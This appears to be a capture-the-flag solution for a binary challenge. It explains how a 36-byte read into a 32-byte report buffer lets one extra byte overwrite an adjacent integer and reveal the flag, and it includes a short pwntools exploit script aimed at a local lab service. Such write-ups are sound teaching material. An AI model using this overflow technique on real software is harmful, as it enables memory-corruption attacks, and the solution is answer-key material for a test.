Solution

Incident stores a 32-byte report immediately before the leaked integer, while read accepts the size of the entire 36-byte structure. Send 33 nonzero bytes: the first 32 fill the report and the final byte changes leaked from zero. The truthy field causes publish to print the flag.

#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9013)

p.sendlineafter(b"> ", b"A" * 33)
print(p.recvall().decode())
